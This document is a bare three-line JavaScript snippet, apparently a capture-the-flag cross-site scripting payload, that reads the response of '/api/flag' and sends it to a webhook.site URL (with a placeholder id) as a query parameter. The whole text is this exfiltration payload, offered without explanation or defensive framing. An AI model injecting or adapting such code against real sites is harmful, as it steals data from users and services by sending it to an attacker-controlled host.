fetch('/api/flag')
  .then(res => res.text())
  .then(flag => fetch('https://webhook.site/XXX?flag=' + encodeURIComponent(flag)));
